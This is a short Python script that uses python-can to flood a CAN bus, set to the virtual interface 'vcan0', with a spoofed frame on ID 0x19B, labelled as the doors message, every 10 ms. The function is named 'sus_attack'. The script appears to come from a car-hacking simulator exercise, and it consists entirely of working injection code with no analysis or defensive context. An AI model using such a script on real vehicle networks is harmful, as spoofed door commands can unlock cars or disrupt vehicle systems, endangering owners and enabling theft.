import can 
import time 

CAN_INTERFACE = "vcan0"  
ID = 0x19B #doors ID

def sus_attack(bus):
    data = [0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00]
    msg = can.Message(arbitration_id = ID, data = data, is_extended_id = False)

    try:
        while True:
            bus.send(msg)
            print(f"sus msg: {msg}")
            time.sleep(0.01)
    except KeyboardInterrupt:
        print("Interruption of messages by keyboard")
    except can.CanError as e:
        print(f"CAN error: {e}")

if __name__ == "__main__":
    with can.interface.Bus(channel=CAN_INTERFACE, bustype="socketcan") as bus:
        sus_attack(bus)